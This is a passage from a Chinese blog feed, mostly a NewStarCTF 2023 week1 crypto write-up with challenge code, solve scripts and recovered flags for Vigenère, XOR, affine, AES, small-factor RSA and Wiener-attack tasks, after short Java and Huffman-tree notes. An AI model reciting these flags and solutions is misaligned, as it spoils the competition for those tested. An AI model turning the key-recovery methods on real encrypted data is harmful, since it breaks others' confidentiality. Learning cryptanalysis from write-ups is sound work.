class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//从键盘输入字符串</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<span class="hljs-comment">//导入</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">myScanner</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br>        System.out.println(<span class="hljs-string">&quot;请输入名字: &quot;</span>);<br>        name = myScanner.next();<br>        System.out.println(<span class="hljs-string">&quot;输入的名字为：&quot;</span> + name);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>记事本乱码解决方案：</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1697599757237.png"alt="1697599757237" /><figcaption aria-hidden="true">1697599757237</figcaption></figure><h3 id="类的封装">类的封装</h3><p>定义：类的封装，是指将对象的状态信息隐藏在对象内部，不允许外部程序直接访问对象的内部信息，而是通过该类所提供的方法来实现对内部信息的操作访问。</p><p>如何实现封装：在定义一个类时，将类中的属性私有化，即<strong>使用private关键字来修饰，私有属性只能在它所在类中被访问</strong>，如果外界想要访问私有属性，需要提供一些使用public修饰的公有方法，其中包括用于获取属性值的getXxx()方法和设置属性值的setXxx()方法。</p><h3 id="类的继承">类的继承</h3><p>定义：在Java中，类的继承是指在一个现有类的基础上去构建一个新的类，构建出来的新类被称作子类，现有类被称作父类或基类，子类会自动拥有父类所有可继承的属性和方法</p><h3 id="多态">多态</h3><p>定义：在Java中，多态是指不同类的对象在调用同一个方法时所呈现出的多种不同行为。</p><p>说明：通常来说，在一个类中定义的属性和方法被其他类继承或重写后，当把子类对象直接赋值给父类引用变量时，相同引用类型的变量调用同一个方法所呈现出的多种不同形态。</p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构实验</title>
    <link href="/2023/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C/"/>
    <url>/2023/10/17/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="哈夫曼编码">哈夫曼编码</h2><p><ahref="https://blog.csdn.net/qq_35852228/article/details/111192722?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=哈夫曼编码c&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-111192722.142%5Ev96%5Epc_search_result_base1&amp;spm=1018.2226.3001.4187">数据结构：霍夫曼（哈夫曼）编码（C语言）_数据结构求huffman编码-CSDN博客</a></p><p>今天刚学到（10.17）：</p><p>D.对给定的输入数值集合所生成的哈夫曼树深度是确定的 （×）</p><p>解释：当两个结点的和与另外两结点的值相同时，组合顺序不同生产的哈夫曼树深度不同，比如权分别为：1，1，2，2，</p>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NewStarCTF 2023 week1</title>
    <link href="/2023/10/02/NewStarCTF%202023%20week1/"/>
    <url>/2023/10/02/NewStarCTF%202023%20week1/</url>
    
    <content type="html"><![CDATA[<p>NewStarCTF 2023 week1 Crypto方向的一些题</p><h2 id="vigenère">Vigenère</h2><p>维吉尼亚密码解密</p><p>打开txt后就一段字符：</p><p>pqcq{qc_m1kt4_njn_5slp0b_lkyacx_gcdy1ud4_g3nv5x0}</p><p>前四个应该是对应flag，直接找就欧克了</p><p>下表<strong>上面一行是明文，左边一列是密钥</strong></p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1695730908860.png"alt="1695730908860" /><figcaption aria-hidden="true">1695730908860</figcaption></figure><p>这段字符害的我好苦，太傻了我，都找到key是kfck了，怎么就不能想到是key的长度是3呢</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1695729736638.png"alt="1695729736638" /><figcaption aria-hidden="true">1695729736638</figcaption></figure><p>但是好像有什么更厉害的遍历网站/代码，可是我没找到😥（</p><h2 id="babyxor">babyxor</h2><h3 id="main">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> *<br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append(f ^ key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><span class="hljs-comment"># e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2</span><br></code></pre></td></tr></table></figure><h3 id="exp">exp</h3><p>看了知道是异或</p><p><code>ord("a")</code> <strong>会返回字母 a对应的ASCII码：97</strong></p><p>将f转换成对应的ASCII码，与0xe9进行异或就可以获得key</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-img1695732585874.png"alt="1695732585874" /><figcaption aria-hidden="true">1695732585874</figcaption></figure><p>得到key是143</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii         <span class="hljs-comment"># 该模块包含了十六进制编码和解码的函数。</span><br>cipher = <span class="hljs-string">&quot;e9e3eee8f4f7bffdd0bebad0fcf6e2e2bcfbfdf6d0eee1ebd0eabbf5f6aeaeaeaeaeaef2&quot;</span><br>c = binascii.unhexlify(cipher)  <span class="hljs-comment"># 将十六进制字符串 cipher 解码为字节序列并将结果存储在变量 c 中</span><br>                                <span class="hljs-comment"># binascii.unhexlify() 函数用于将十六进制字符串转换为二进制数据。</span><br><br>key = <span class="hljs-number">143</span><br><br>result = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    result += <span class="hljs-built_in">chr</span>(i^key)    <span class="hljs-comment"># chr() 函数用于将一个整数转换为对应的字符。</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h2 id="affine">Affine</h2><h3 id="main-1">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag, key<br><br>modulus = <span class="hljs-number">256</span><br><br>ciphertext = []<br><br><span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> flag:<br>    ciphertext.append((key[<span class="hljs-number">0</span>]*f + key[<span class="hljs-number">1</span>]) % modulus)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(ciphertext).<span class="hljs-built_in">hex</span>())<br><br><span class="hljs-comment"># dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064</span><br><br><br></code></pre></td></tr></table></figure><h3 id="exp-1">exp</h3><p>仿射密码</p><p>exp是照着一个师傅的代码copy的</p><p><ahref="https://blog.csdn.net/qq_38798840/article/details/127206181?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=Newstarctf&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-7-127206181.142%5Ev94%5EchatsearchT3_1&amp;spm=1018.2226.3001.4187">NewStarCTF公开赛week2密码学题目wp_ctf密码学题目_想要变强的47的博客-CSDN博客</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><br>a = <span class="hljs-string">&quot;dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064&quot;</span><br><br><span class="hljs-comment"># 使用 bytes.fromhex() 方法将十六进制字符串转换为字节数据</span><br>byte_data = <span class="hljs-built_in">bytes</span>.fromhex(a)<br><br><span class="hljs-comment"># 打印字节数据</span><br><span class="hljs-built_in">print</span>(byte_data)<br><br><br><span class="hljs-comment"># f1=ord(&#x27;\xb1&#x27;)</span><br><span class="hljs-comment"># #f2=ord(&#x27;\x83&#x27;) #因为&#x27;l&#x27;-&#x27;f&#x27;的值是6,6找不到模256的乘法逆元所以不能用f和l两个字母求解未知因数a</span><br><span class="hljs-comment"># f3=ord(&#x27;\x82&#x27;)</span><br><span class="hljs-comment"># f4=ord(&#x27;T&#x27;)  #ord(&#x27;T&#x27;)=84，是g对应的密文</span><br><br>f1=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;\xdd&#x27;</span>)<br><span class="hljs-comment">#f2=ord(&#x27;C&#x27;)   #因为&#x27;l&#x27;-&#x27;f&#x27;的值是6,6找不到模256的乘法逆元所以不能用f和l两个字母求解未知因数a</span><br>f3=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;\x88&#x27;</span>)<br>f4=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;\xee&#x27;</span>) <br><br><br>m1=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;f&#x27;</span>)<br><span class="hljs-comment">#m2=ord(&#x27;l&#x27;)</span><br>m3=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;a&#x27;</span>)<br>m4=<span class="hljs-built_in">ord</span>(<span class="hljs-string">&#x27;g&#x27;</span>)  <span class="hljs-comment">#ord(&#x27;g&#x27;)=103，可以验证a=17,b=23时满足(103*a+b)%256 = 238 = ord(&#x27;\xee&#x27;)</span><br><br>a=(f3-f1)*gmpy2.invert(m3-m1,<span class="hljs-number">256</span>)%<span class="hljs-number">256</span> <span class="hljs-comment">#可以用&#x27;f&#x27;和&#x27;a&#x27;求解出a</span><br><span class="hljs-built_in">print</span>(a)   <span class="hljs-comment">#a=17</span><br>b=(f1-a*m1)%<span class="hljs-number">256</span><br><span class="hljs-built_in">print</span>(b)   <span class="hljs-comment">#b=23</span><br><br><span class="hljs-comment"># c=&quot;\xb1\x83\x82T\x10\x80\xc9O\x84\xc9&lt;\x0f\xf2\x82\x9a\xc9\x9b8&#x27;\x9b&lt;\xdb\x9b\x9b\x82\xc8\xe0V&quot;</span><br><br>c=<span class="hljs-string">&quot;\xddC\x88\xeeB\x8b\xdd\xddXe\xccf\xaaX\x87\xff\xcc\xa9f\x10\x9cf\xed\xcc\xa9 fz\x881 d&quot;</span><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> cc <span class="hljs-keyword">in</span> c:<br>    m=(<span class="hljs-built_in">ord</span>(cc)-b)*gmpy2.invert(a,<span class="hljs-number">256</span>)%<span class="hljs-number">256</span><br>    flag+=<span class="hljs-built_in">chr</span>(m)<br><br><span class="hljs-built_in">print</span>(flag)<br><br><br></code></pre></td></tr></table></figure><blockquote><p>为什么是dd、C、88、ee这样组合呢？</p><p>我的想法是你可以看原来的十六进制的数据 a ="dd4388ee428bdddd5865cc66aa5887ffcca966109c66edcca920667a88312064"</p><p>因为一个字节由8个二进制位组成，表示成十六进制就是2个十六进制位组成，那么就是两个一组表示一个字节</p><p>也就是dd、43、88、ee，即下面的dd、C、88、ee，写的时候要写成''，</p></blockquote><blockquote><p><code>f1 = ord('\xdd')</code>这行代码的作用是将十六进制表示的字节序列 <code>'\xdd'</code>转换为对应的整数值，并将结果赋值给变量 <code>f1</code>。</p><ol type="1"><li><code>\xdd</code>: 这是一个字符串字面量，其中 <code>\x</code>是表示后面两个字符是十六进制值的转义序列，<code>dd</code>是两个十六进制数字，表示一个字节的十六进制值。在这里，<code>\xdd</code>表示一个字节，其十六进制值为 <code>0xdd</code>。</li><li><code>ord()</code>: 这是一个内置函数，用于获取给定字符的 Unicode码点（整数值）。在这里，<code>ord('\xdd')</code> 将返回<code>221</code>，因为十六进制 <code>0xdd</code> 对应的十进制值是<code>221</code>。</li><li><code>ord("a")</code> <strong>会返回字母 a对应的ASCII码：97</strong></li></ol><p>所以，<code>f1</code> 最终的值将是 <code>221</code>，因为它表示了字符<code>'\xdd'</code> 对应的 Unicode 码点。</p></blockquote><h2 id="babyaes">babyaes</h2><h3 id="main-2">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pad</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> data + <span class="hljs-string">b&quot;&quot;</span>.join([<span class="hljs-string">b&#x27;\x00&#x27;</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span> - <span class="hljs-built_in">len</span>(data))])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    flag_ = pad(flag)<br>    key = os.urandom(<span class="hljs-number">16</span>) * <span class="hljs-number">2</span><br>    iv = os.urandom(<span class="hljs-number">16</span>)<br>    <span class="hljs-built_in">print</span>(bytes_to_long(key) ^ bytes_to_long(iv) ^ <span class="hljs-number">1</span>)<br>    aes = AES.new(key, AES.MODE_CBC, iv)<br>    enc_flag = aes.encrypt(flag_)<br>    <span class="hljs-built_in">print</span>(enc_flag)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><span class="hljs-comment"># 3657491768215750635844958060963805125333761387746954618540958489914964573229</span><br><span class="hljs-comment"># b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="exp-2">exp</h3><p>官方说法：</p><p>解密 flag 我们需要获取到 key 和 iv 的值，由条件：</p><p>key=os.urandom(16)*2</p><p>iv=os.urandom(16)</p><p>可知：key是32bytes,256bits ；iv是16bytes ,128bits</p><p>key^iv ，那么只有 iv 与 key 的低128位相异或，所以 key的高128位是固定不变的。所以 xor 的高128bits,就是 key的高128bits,进而可以得到 key 的所有值256bits。</p><p>之后 key 的低128bits，与 xor 的低128bits 相异或，所得结果就是 iv的值了</p><p>得到 key , iv 后就可以直接用aes.decrypt()来解密了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 这是我的exp，没成功，（后来发现是做出来了😡</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">import</span> os<br> <br><br>out = <span class="hljs-number">3657491768215750635844958060963805125333761387746954618540958489914964573229</span><br><span class="hljs-comment"># 转换成为字节类型</span><br>out =long_to_bytes(out)<br><br>flag_encrypted = <span class="hljs-string">b&#x27;&gt;]\xc1\xe5\x82/\x02\x7ft\xf1B\x8d\n\xc1\x95i&#x27;</span><br> <br><span class="hljs-comment">#高十六位是key的高十六位 并且key是按照16位进行重复 所以得到高16位就能得到整个key</span><br>key = out[:<span class="hljs-number">16</span>]*<span class="hljs-number">2</span><br><br><br><span class="hljs-comment"># 把key的低十六位与out的低十六位做异或就能得到向量iv</span><br>iv = bytes_to_long(key[<span class="hljs-number">16</span>:]) ^ bytes_to_long(out[<span class="hljs-number">16</span>:])<br><br><span class="hljs-comment">#重新转换成为字节</span><br>iv = long_to_bytes(iv)<br><span class="hljs-comment">#创建aes解密器 需要秘钥key 解密模式 还有解密向量iv</span><br>aes = AES.new(key,AES.MODE_CBC,iv)<br><span class="hljs-comment">#使用解密器解密</span><br>flag = aes.decrypt(flag_encrypted)<br><br><span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-comment"># b&#x27;firsT_cry_Aes\x00\x00\x01&#x27;</span><br><span class="hljs-comment"># 然后flag&#123;firsT_cry_Aes&#125;，测！</span><br></code></pre></td></tr></table></figure><h2 id="babyrsa">babyrsa</h2><blockquote><p>提示：很容易分解的n</p></blockquote><h3 id="main-3">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> flag <span class="hljs-keyword">import</span> flag<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gen_prime</span>(<span class="hljs-params">n</span>):<br>    res = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">15</span>):<br>        res *= getPrime(n)<br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    n = gen_prime(<span class="hljs-number">32</span>)<br>    e = <span class="hljs-number">65537</span><br>    m = bytes_to_long(flag)<br>    c = <span class="hljs-built_in">pow</span>(m,e,n)<br>    <span class="hljs-built_in">print</span>(n)<br>    <span class="hljs-built_in">print</span>(c)<br><span class="hljs-comment"># 17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span><br><span class="hljs-comment"># 14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><br><br></code></pre></td></tr></table></figure><h3 id="exp-3">exp</h3><blockquote><p>跟MoeCTF 2023 factor_signin 一题一样</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> reduce<br><br>e = <span class="hljs-number">65537</span><br>n = <span class="hljs-number">17290066070594979571009663381214201320459569851358502368651245514213538229969915658064992558167323586895088933922835353804055772638980251328261</span><br>c = <span class="hljs-number">14322038433761655404678393568158537849783589481463521075694802654611048898878605144663750410655734675423328256213114422929994037240752995363595</span><br><br><br>factor = <span class="hljs-string">&#x27;&#x27;&#x27;P10 = 3831680819</span><br><span class="hljs-string">P10 = 2338725373</span><br><span class="hljs-string">P10 = 2370292207</span><br><span class="hljs-string">P10 = 2706073949</span><br><span class="hljs-string">P10 = 2970591037</span><br><span class="hljs-string">P10 = 2923072267</span><br><span class="hljs-string">P10 = 3654864131</span><br><span class="hljs-string">P10 = 2463878387</span><br><span class="hljs-string">P10 = 3939901243</span><br><span class="hljs-string">P10 = 2804303069</span><br><span class="hljs-string">P10 = 3207148519</span><br><span class="hljs-string">P10 = 4093178561</span><br><span class="hljs-string">P10 = 2217990919</span><br><span class="hljs-string">P10 = 2794985117</span><br><span class="hljs-string">P10 = 4278428893&#x27;&#x27;&#x27;</span><br><br>factor = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,[i.split()[-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> factor.split(<span class="hljs-string">&#x27;\n&#x27;</span>)]))<br>phin = reduce(<span class="hljs-keyword">lambda</span> a,b:a*(b-<span class="hljs-number">1</span>),[<span class="hljs-number">1</span>] + factor)<br><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phin)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-comment"># print(bytes.fromhex(hex(pow(c2,d,n2))[2:]))</span><br><br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment"># b&#x27;flag&#123;us4_s1ge_t0_cal_phI&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="small-d">small d</h2><h3 id="main-4">main</h3><blockquote><p>提示: Michael J. Wiener 觉得很赞</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br><br>d = getPrime(<span class="hljs-number">32</span>)<br>e = inverse(d, (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>n = p*q<br>m = bytes_to_long(flag)<br><br>c = <span class="hljs-built_in">pow</span>(m,e,n)<br><br><span class="hljs-built_in">print</span>(c)<br><span class="hljs-built_in">print</span>(e)<br><span class="hljs-built_in">print</span>(n)<br><br><span class="hljs-comment"># c = 6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br><span class="hljs-comment"># e = 8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br><span class="hljs-comment"># n = 19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br><br></code></pre></td></tr></table></figure><h3 id="exp-4">exp</h3><blockquote><p>[RSA2]4(Wiener)</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 直接用xenny师傅的库</span><br><span class="hljs-keyword">import</span> libnum<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">from</span> xenny.ctf.crypto.modern.asymmetric.rsa <span class="hljs-keyword">import</span> wiener<br><span class="hljs-comment"># e很大 wiener攻击</span><br>c = <span class="hljs-number">6755916696778185952300108824880341673727005249517850628424982499865744864158808968764135637141068930913626093598728925195859592078242679206690525678584698906782028671968557701271591419982370839581872779561897896707128815668722609285484978303216863236997021197576337940204757331749701872808443246927772977500576853559531421931943600185923610329322219591977644573509755483679059951426686170296018798771243136530651597181988040668586240449099412301454312937065604961224359235038190145852108473520413909014198600434679037524165523422401364208450631557380207996597981309168360160658308982745545442756884931141501387954248</span><br>e = <span class="hljs-number">8614531087131806536072176126608505396485998912193090420094510792595101158240453985055053653848556325011409922394711124558383619830290017950912353027270400567568622816245822324422993074690183971093882640779808546479195604743230137113293752897968332220989640710311998150108315298333817030634179487075421403617790823560886688860928133117536724977888683732478708628314857313700596522339509581915323452695136877802816003353853220986492007970183551041303875958750496892867954477510966708935358534322867404860267180294538231734184176727805289746004999969923736528783436876728104351783351879340959568183101515294393048651825</span><br>n = <span class="hljs-number">19873634983456087520110552277450497529248494581902299327237268030756398057752510103012336452522030173329321726779935832106030157682672262548076895370443461558851584951681093787821035488952691034250115440441807557595256984719995983158595843451037546929918777883675020571945533922321514120075488490479009468943286990002735169371404973284096869826357659027627815888558391520276866122370551115223282637855894202170474955274129276356625364663165723431215981184996513023372433862053624792195361271141451880123090158644095287045862204954829998614717677163841391272754122687961264723993880239407106030370047794145123292991433</span><br><br>d, p, q = wiener.attack(n, e)<br>m = <span 